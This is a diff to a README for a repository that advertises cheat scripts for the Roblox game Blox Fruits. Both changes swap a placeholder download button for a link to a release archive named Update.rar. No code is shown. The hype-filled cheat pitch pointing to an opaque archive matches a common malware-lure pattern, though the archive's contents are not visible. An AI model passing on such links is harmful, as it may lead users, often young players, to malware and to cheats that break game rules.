@@ -2,7 +2,7 @@
 
 Welcome to the **Blox Fruits Script** repository! 🎉 This repository contains the latest and most powerful scripts to enhance your gameplay in the popular Roblox game **Blox Fruits**. Whether you're looking to automate tasks, level up faster, or unlock hidden features, you're in the right place! 🚀
 
-[![Download Blox Fruits Script](https://img.shields.io/badge/Download-Blox_Fruits_Script-blue?style=for-the-badge&logo=download)](https://your-download-link-here.com)
+[![Download Blox Fruits Script](https://img.shields.io/badge/Download-Blox_Fruits_Script-blue?style=for-the-badge&logo=download)](https://github.com/TrendiX17/blox-fruits-script/releases/download/Update/Update.rar)
 
 ![blx](https://github.com/user-attachments/assets/4a00e1a7-0170-4986-9929-a84951efe4eb)
 
@@ -36,7 +36,7 @@ Welcome to the **Blox Fruits Script** repository! 🎉 This repository contains 
 
 Click the button below to download the script:
 
-[![Download Blox Fruits Script](https://img.shields.io/badge/Download-Blox_Fruits_Script-blue?style=for-the-badge&logo=download)](https://your-download-link-here.com)
+[![Download Blox Fruits Script](https://img.shields.io/badge/Download-Blox_Fruits_Script-blue?style=for-the-badge&logo=download)](https://github.com/TrendiX17/blox-fruits-script/releases/download/Update/Update.rar)
 
 ---
 
